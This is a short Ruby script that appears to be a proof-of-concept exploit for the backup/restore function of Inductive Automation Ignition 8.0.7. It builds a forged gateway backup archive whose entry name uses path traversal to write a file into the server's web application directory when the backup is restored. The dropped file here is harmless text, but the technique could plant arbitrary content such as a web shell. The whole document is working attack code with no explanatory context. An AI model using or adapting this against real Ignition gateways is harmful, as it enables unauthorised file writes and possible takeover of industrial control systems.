#!/usr/bin/env ruby
# Inductive Automation Ignition Version 8.0.7 backup/restore (restore)

require 'rex'
require 'rex/zip'

xml = %Q|<?xml version="1.0" encoding="UTF-8"?>
<gateway-backup>
	<version>8.0.7.2019122014</version>
	<timestamp>2020-03-30 10:23:05</timestamp>
	<backup-type>DATA_ONLY</backup-type>
	<ts>1585588985662</ts>
	<edition></edition>
</gateway-backup>
|

zip = Rex::Zip::Archive.new
zip.add_file("\\..\\webserver\\webapps\\main\\lalo.txt", "i love lalo!") 
zip.add_file("backupinfo.xml",xml) 
zip.save_to("MC.gwbk")

